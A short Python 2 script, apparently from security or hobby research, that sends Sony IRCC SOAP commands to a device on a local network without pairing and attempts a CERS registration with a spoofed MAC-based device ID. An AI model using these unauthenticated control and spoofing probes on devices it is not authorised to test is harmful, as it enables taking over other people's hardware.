#! /usr/bin/env python
# -*- coding: utf-8 -*-
import functools
import httplib
import Queue
import os
import re
import string
import socket
import sys
import threading
import telnetlib
import time
import urllib

if __name__ == '__main__':
	soapTemplate = """<?xml version="1.0" encoding="UTF-8"?>
	<SOAP-ENV:Envelope 
	SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"  
	xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
	<SOAP-ENV:Body>
	<m:X_SendIRCC xmlns:m="urn:schemas-sony-com:service:IRCC:1">
	<IRCCCode xmlns:dt="urn:schemas-microsoft-com:datatypes" dt:dt="string">AAAAAQAAAAEAAAAUAw==</IRCCCode>
	</m:X_SendIRCC>
	</SOAP-ENV:Body>
	</SOAP-ENV:Envelope>
	"""
	
	try:
		# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
		# CONTROL ATTEMPT - PORT 80, NO PAIRING, NO SPOOFING
		print "Control attempt on Port 80: "
		conn = httplib.HTTPConnection("192.168.178.32", 80)
		conn.connect()
		conn.putrequest('POST', "/sony/IRCC")
		conn.putheader("Content-type", "text/xml; charset=\"UTF-8\"")
		conn.putheader("SOAPAction", "\"urn:schemas-sony-com:service:IRCC:1#X_SendIRCC\"")
		conn.putheader("Content-Length", "%d" % len(soapTemplate))
		conn.endheaders()
		conn.send(soapTemplate)

		responseToREST = conn.getresponse()
		print "Response: [" + str(responseToREST.status) + "] " + responseToREST.read()
	except Exception as e:
		print "Exception: " + str(e)
	
	try:
		# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
		# CONTROL ATTEMPT - PORT 52323, NO PAIRING, NO SPOOFING
		print "Control attempt on Port 52323: "
		conn = httplib.HTTPConnection("192.168.178.32", 52323)
		conn.connect()
		conn.putrequest('POST', "/sony/IRCC")
		conn.putheader("Content-type", "text/xml; charset=\"UTF-8\"")
		conn.putheader("SOAPAction", "\"urn:schemas-sony-com:service:IRCC:1#X_SendIRCC\"")
		conn.putheader("Content-Length", "%d" % len(soapTemplate))
		conn.endheaders()
		conn.send(soapTemplate)

		responseToREST = conn.getresponse()
		print "Response: [" + str(responseToREST.status) + "] " + responseToREST.read()
	except Exception as e:
		print "Exception: " + str(e)
		
	try:
		# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
		# CERS REGISTRATION ATTEMPT, SPOOF MAC
		print "CERS Registration Attempt (Port 80): "
		conn = httplib.HTTPConnection("192.168.178.32", 80)
		conn.connect()
		conn.putrequest('GET', "/cers/api/register?registrationType=new&deviceId=MediaRemote%3A9c-d2-1e-6-3f-14")
		
		responseToCERS =  conn.getresponse()
		print "Response: [" + str(responseToCERS.status) + "] " + responseToCERS.read()

	except Exception as e:
		print "Exception: " + str(e)
	